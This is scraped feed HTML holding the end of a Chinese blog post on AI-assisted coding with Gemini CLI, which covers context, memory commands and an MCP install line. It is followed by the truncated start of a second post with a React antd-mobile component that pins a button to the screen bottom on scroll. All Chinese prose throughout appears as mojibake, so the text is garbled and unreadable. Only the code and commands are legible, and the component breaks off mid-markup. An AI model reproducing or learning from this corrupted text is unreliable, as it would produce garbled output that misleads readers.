<p>ä¼šè¯ä¹‹é—´éš¾ä»¥ç»§æ‰¿é¡¹ç›®è®¤çŸ¥</p>
</li>
<li>
<p>è§„åˆ™ã€çº¦å®šéœ€è¦åå¤è¯´æ˜</p>
</li>
<li>
<p>å¯¹é•¿å‘¨æœŸåä½œå¹¶ä¸å‹å¥½</p>
</li>
</ul>
<p>è¿™ä¸æ˜¯èƒ½åŠ›é—®é¢˜ï¼Œè€Œæ˜¯è®¾è®¡å–å‘ä¸åŒã€‚</p>
<p>ä¹Ÿæ­£å› ä¸ºåŒæ—¶ä½¿ç”¨è¿‡è¿™ä¸¤ç±»å·¥å…·ï¼Œæˆ‘æ‰æ›´åŠ ç¡®ä¿¡ï¼š</p>
<blockquote>
<p><strong>æ¨¡å‹å¼ºä¸å¼ºå†³å®šä¸‹é™ï¼Œ</strong></p>
</blockquote>
<blockquote>
<p><strong>æ˜¯å¦å…·å¤‡ä¸Šä¸‹æ–‡ä¸è®°å¿†æœºåˆ¶ï¼Œæ‰å†³å®šå®ƒèƒ½å¦è¿›å…¥æ—¥å¸¸å·¥ç¨‹æµã€‚</strong>****</p>
</blockquote>
<hr/>
<h2 data-id="heading-9"><strong>ä¸ƒã€2025 æˆ‘å­¦åˆ°çš„ç»“è®ºï¼šAI ææ•ˆçš„æ ¸å¿ƒæ˜¯â€œä¸Šä¸‹æ–‡æ²»ç†â€</strong></h2>
<p>è¿™ä¸€å¹´çœŸæ­£å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸åªæ˜¯å·¥å…·ï¼Œè€Œæ˜¯æˆ‘è‡ªå·±ã€‚</p>
<p>æˆ‘å¼€å§‹æ›´å¤šåœ°åšè¿™äº›äº‹ï¼š</p>
<ul>
<li>
<p>æ˜ç¡®è§„åˆ™ä¸è¾¹ç•Œ</p>
</li>
<li>
<p>è®¾è®¡éªŒæ”¶æ ‡å‡†</p>
</li>
<li>
<p>æŠŠâ€œæ­£ç¡®æ€§â€å·¥ç¨‹åŒ–</p>
</li>
</ul>
<p>AI ä¾ç„¶å†™å¾—å¾ˆå¿«ï¼Œä½†<strong>ä¸å†å¤±æ§</strong>ã€‚</p>
<p><strong>Vibe Coding ä¸æ˜¯æ”¾é£ï¼Œè€Œæ˜¯å»ºç«‹ä¿¡ä»»çš„å‰æã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/426487422a3d4530874891e416853ff2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=ekGXudpt74VSqRKSKPbZ1s31zhA%3D" alt="æˆªå±2026-01-08 15.59.02.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10"><strong>å†™åœ¨æœ€åï¼š2026ï¼Œæˆ‘ä¼šç»§ç»­æŠŠ AI å½“æˆå·¥ç¨‹ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†</strong></h2>
<p>2026 å¹´ï¼Œæˆ‘ä¸ä¼šå†è¿½é€â€œæ›´å¼ºçš„æç¤ºè¯â€ã€‚</p>
<p>æˆ‘ä¼šç»§ç»­ï¼š</p>
<ul>
<li>
<p>åˆ†å±‚ç»´æŠ¤é¡¹ç›®ä¸Šä¸‹æ–‡</p>
</li>
<li>
<p>å›ºåŒ–é«˜é¢‘ä»»åŠ¡ä¸ºå‘½ä»¤</p>
</li>
<li>
<p>ç”¨ MCP è¿æ¥æ›´å¤šçœŸå®æ•°æ®æº</p>
</li>
</ul>
<p>å› ä¸ºæˆ‘å·²ç»ç¡®è®¤äº†ä¸€ä»¶äº‹ï¼š</p>
<blockquote>
<p><strong>å½“ä¸Šä¸‹æ–‡æ¸…æ™°ã€è®°å¿†å¯é ï¼Œ</strong></p>
</blockquote>
<blockquote>
<p><strong>AI æ‰çœŸæ­£å…·å¤‡è¿›å…¥ç”Ÿäº§ç¯å¢ƒçš„èµ„æ ¼ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-11"><strong>åŒä¸ºç¬¬ä¸€æ¢¯é˜Ÿï¼Œæˆ‘ä¸ºä»€ä¹ˆå¯¹â€œä¸Šä¸‹æ–‡èƒ½åŠ›â€æ ¼å¤–æ•æ„Ÿ</strong></h2>
<blockquote>
<p>è¿™ä¸€ç‚¹ï¼Œå…¶å®å’Œæˆ‘åŒæ—¶ä½¿ç”¨ <strong>Codex 5.2</strong> æœ‰å¾ˆå¤§å…³ç³»ã€‚</p>
</blockquote>
<p>2025 å¹´ï¼Œæˆ‘å¹¶ä¸æ˜¯åªç”¨ Geminiã€‚</p>
<p>ä½œä¸ºç¬¬ä¸€æ¢¯é˜Ÿæ¨¡å‹ï¼Œ<strong>Codex 5.2</strong> åœ¨ä»£ç ç”Ÿæˆè´¨é‡ã€é€»è¾‘ä¸¥è°¨æ€§ä¸ŠåŒæ ·éå¸¸å¼ºï¼Œç”šè‡³åœ¨æŸäº›å¤æ‚ç®—æ³•å’ŒæŠ½è±¡å»ºæ¨¡ä¸Šï¼Œè¡¨ç°å¾—æ›´â€œåƒå·¥ç¨‹å¸ˆâ€ã€‚</p>
<p>ä½†åœ¨çœŸå®é¡¹ç›®åä½œä¸­ï¼Œæˆ‘å¾ˆå¿«æ„Ÿå—åˆ°äº†ä¸€ä¸ªå†³å®šæ€§çš„å·®å¼‚ï¼š</p>
<blockquote>
<p><strong>Codex 5.2ï¼ˆå³ä½¿å·²å¼€é€šï¼‰å‡ ä¹ä¸å…·å¤‡â€œé¡¹ç›®çº§ä¸Šä¸‹æ–‡è®°å¿†â€ã€‚</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81a69567e6264016a1bcc5683d8d26e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=GnUXi9VwFyEUNNp16ZgMqOg%2BC1E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12"><strong>é™„ï¼šæˆ‘åœ¨é¡¹ç›®ä¸­ä½¿ç”¨çš„å…³é”®å‘½ä»¤ï¼ˆèŠ‚é€‰ï¼‰</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒä¹…åŒ–ä¸Šä¸‹æ–‡</span>
GEMINI.md

<span class="hljs-comment"># çŸ­æœŸè®°å¿†</span>
/memory add
/memory show
/memory refresh

<span class="hljs-comment"># å‹ç¼©å¯¹è¯</span>
/compress

<span class="hljs-comment"># å¼•ç”¨çœŸå®æ–‡ä»¶</span>
@./src/

<span class="hljs-comment"># Shell ç›´é€š</span>
!git status
!pnpm <span class="hljs-built_in">test</span>

<span class="hljs-comment"># å®‰è£… chrome-devtools-mcp</span>
gemini mcp add -s user chrome-devtools npx chrome-devtools-mcp@latest
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ]]></title>    <link>https://juejin.cn/post/7592805973120761862</link>    <guid>https://juejin.cn/post/7592805973120761862</guid>    <pubDate>2026-01-08T10:00:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120761862" data-draft-id="7592805973120712710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T10:00:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="snowæ¥äº†"/> <meta itemprop="url" content="https://juejin.cn/user/1714893871392792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893871392792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    snowæ¥äº†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:00:20.000Z" title="Thu Jan 08 2026 10:00:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨reactå¼€å‘ä¸€ä¸ªantd mobileç»„ä»¶,é¡µé¢ä¸Šæœ‰å¤šä¸ªé«˜åº¦ä¸ç­‰çš„divå…ƒç´ ,æ¯ä¸ªdivåº•éƒ¨éƒ½æœ‰ä¸€ä¸ªã€Œæ ¸å¯¹ã€æŒ‰é’®ã€‚å½“divçš„é«˜åº¦å¤§äºå±å¹•é«˜åº¦çš„æ—¶å€™ï¼Œå°±è¦å°†è¿™ä¸ªdivåº•éƒ¨çš„ã€Œæ ¸å¯¹ã€æŒ‰é’®é”å®šåœ¨é¡µé¢åº•éƒ¨ï¼Œæ–¹ä¾¿ç”¨æˆ·æ“ä½œã€‚å½“ç”¨æˆ·æ»šåŠ¨é¡µé¢ï¼Œè¿™ä¸ªdivçš„åº•éƒ¨è¿›å…¥å±å¹•çš„æ—¶å€™ï¼Œå°±è¦å–æ¶ˆã€Œæ ¸å¯¹ã€æŒ‰é’®çš„é”å®šï¼Œè¦å®ƒå›å½’åŸå¤„ï¼Œè·Ÿéšè¿™ä¸ªdivè¿›è¡Œæ»šåŠ¨ã€‚å½“ç¬¬äºŒä¸ªdivè¿›å…¥å±å¹•50%çš„æ—¶å€™ï¼Œåœ¨æ­¤å°†å®ƒçš„ã€Œæ ¸å¯¹ã€æŒ‰é’®é”å®šåœ¨é¡µé¢ä¸Šã€‚ä½ å¸®æˆ‘ç”¨ç›‘å¬æ»šåŠ¨çš„æ–¹å¼å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½å†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œç»„ä»¶çš„åå­—å«ï¼šMaterialVerificationSon</p>
<p>å¦‚æœå‡ºç°æŒ‰é’®å–æ¶ˆé”å®šæœ‰æŠ–åŠ¨ï¼Œæ˜¯æ ·å¼é—®é¢˜ï¼Œç”¨    transform: isFixed ? 'translateX(-2px)' : 'none',å¯ä»¥è§£å†³</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd-mobile'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// import { useLocation } from '@tanstack/react-location';</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MaterialVerificationSon</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ç¤ºä¾‹æ•°æ®ï¼šåŒ…å«ä¸åŒé«˜åº¦çš„divå†…å®¹</span>
  <span class="hljs-keyword">const</span> [items] = <span class="hljs-title function_">useState</span>([
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬ä¸€ä¸ªææ–™é¡¹ï¼Œé«˜åº¦é€‚ä¸­'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">780</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬äºŒä¸ªææ–™é¡¹ï¼Œé«˜åº¦è¾ƒé«˜ï¼Œå†…å®¹è¾ƒå¤šï¼Œéœ€è¦æ»šåŠ¨æŸ¥çœ‹'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">800</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬ä¸‰ä¸ªææ–™é¡¹ï¼Œé«˜åº¦éå¸¸é«˜ï¼Œå†…å®¹éå¸¸å¤šï¼Œéœ€è¦å¤§é‡æ»šåŠ¨'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1200</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">4</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬å››ä¸ªææ–™é¡¹ï¼Œé«˜åº¦é€‚ä¸­'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">400</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬äº”ä¸ªææ–™é¡¹ï¼Œé«˜åº¦è¾ƒé«˜'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">900</span> },
  ]);
  <span class="hljs-keyword">const</span> contentRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªå…ƒç´ çš„ref</span>
  <span class="hljs-keyword">const</span> itemRefs = useRef&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-title class_">HTMLDivElement</span> | <span class="hljs-literal">null</span>&gt;&gt;([]);
  <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªæŒ‰é’®çš„é”å®šçŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [lockedButtons, setLockedButtons] = useState&lt;<span class="hljs-title class_">Record</span>&lt;number, boolean&gt;&gt;({});

  <span class="hljs-comment">// è·å–å±å¹•é«˜åº¦</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getScreenHeight</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦åœ¨è§†å£ä¸­</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">return</span> rect.<span class="hljs-property">top</span> &lt; <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; rect.<span class="hljs-property">bottom</span> &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ åº•éƒ¨æ˜¯å¦åœ¨è§†å£å†…</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementBottomInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementBottom = rect.<span class="hljs-property">bottom</span>;
    <span class="hljs-keyword">return</span> elementBottom &lt;= <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; elementBottom &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦è‡³å°‘æœ‰50%åœ¨è§†å£å†…</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementHalfVisible</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementHeight = rect.<span class="hljs-property">height</span>;
    <span class="hljs-keyword">const</span> visibleHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-title function_">getScreenHeight</span>() - rect.<span class="hljs-property">top</span>, <span class="hljs-number">0</span>), elementHeight);
    <span class="hljs-keyword">return</span> visibleHeight / elementHeight &gt;= <span class="hljs-number">0.5</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦è¿‡é«˜ï¼ˆè¶…è¿‡å±å¹•é«˜åº¦ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementTooTall</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">return</span> element.<span class="hljs-property">scrollHeight</span> &gt; <span class="hljs-title function_">getScreenHeight</span>();
  };

  <span class="hljs-comment">// å¤„ç†æ»šåŠ¨äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleScroll</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newLockedButtons</span>: <span class="hljs-title class_">Record</span>&lt;number, boolean&gt; = {};

    items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> element = itemRefs.<span class="hljs-property">current</span>[index];
      <span class="hljs-keyword">if</span> (!element) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> elementTooTall = <span class="hljs-title function_">isElementTooTall</span>(element); <span class="hljs-comment">//æ˜¯å¦å¤§äºå±å¹•é«˜åº¦</span>
      <span class="hljs-keyword">const</span> elementInViewport = <span class="hljs-title function_">isElementInViewport</span>(element); <span class="hljs-comment">//æ˜¯ä¸æ˜¯åœ¨è§†å£é‡Œé¢</span>
      <span class="hljs-keyword">const</span> elementBottomInViewport = <span class="hljs-title function_">isElementBottomInViewport</span>(element); <span class="hljs-comment">//æ£€æŸ¥å…ƒç´ åº•éƒ¨æ˜¯å¦åœ¨è§†å£å†…</span>
      <span class="hljs-keyword">const</span> elementHalfVisible = <span class="hljs-title function_">isElementHalfVisible</span>(element); <span class="hljs-comment">//è§†å£50%</span>

      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(elementInViewport, index);
      <span class="hljs-keyword">if</span> (elementInViewport &amp;&amp; elementTooTall &amp;&amp; elementHalfVisible) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">true</span>;
      }

      <span class="hljs-keyword">if</span> (elementBottomInViewport) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">false</span>;
      }
    });

    <span class="hljs-title function_">setLockedButtons</span>(newLockedButtons);
  };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(lockedButtons, <span class="hljs-number">9999</span>);
  <span class="hljs-comment">// æ·»åŠ æ»šåŠ¨äº‹ä»¶ç›‘å¬å™¨</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
      contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      <span class="hljs-comment">// åˆå§‹æ‰§è¡Œä¸€æ¬¡</span>
      <span class="hljs-title function_">handleScroll</span>();
    }

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
        contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      }
    };
  }, []);

  <span class="hljs-comment">// æ ¸å¯¹æŒ‰é’®ç‚¹å‡»å¤„ç†</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleVerify</span> = (<span class="hljs-params">id: number</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ ¸å¯¹æŒ‰é’®è¢«ç‚¹å‡»ï¼ŒID: <span class="hljs-subst">${id}</span>`</span>);
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…·ä½“çš„æ ¸å¯¹é€»è¾‘</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', <span class="hljs-attr">height:</span> '<span class="hljs-attr">100vh</span>', <span class="hljs-attr">overflowY:</span> '<span class="hljs-attr">auto</span>' }} <span class="hljs-attr">ref</span>=<span class="hljs-string">{contentRef}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ææ–™æ ¸å¯¹é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>

      {items.map((item, index) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span>
          <span class="hljs-attr">ref</span>=<span class="hljs-string">{el</span> =&gt;</span> (itemRefs.current[index] = el)}
          style={{
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '16px',
            marginBottom: '16px',
            overflowY: 'auto',
          }}
        &gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ææ–™é¡¹ {item.id}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{item.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é«˜åº¦: {item.height}px<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">item.height</span>}<span class="hljs-attr">px</span>` }}&gt;</span>
            è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹å†…å®¹ï¼Œå®é™…åº”ç”¨ä¸­è¿™é‡Œä¼šæœ‰å…·ä½“çš„ææ–™ä¿¡æ¯ã€‚
          <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

          {/* æ ¸å¯¹æŒ‰é’® */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
              <span class="hljs-attr">position:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">fixed</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">static</span>',
              <span class="hljs-attr">bottom:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">20px</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">left:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">50</span>%' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">transform:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">translateX</span>(<span class="hljs-attr">-50</span>%)' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>',
              <span class="hljs-attr">zIndex:</span> <span class="hljs-attr">1000</span>,
              <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%',
              <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>',
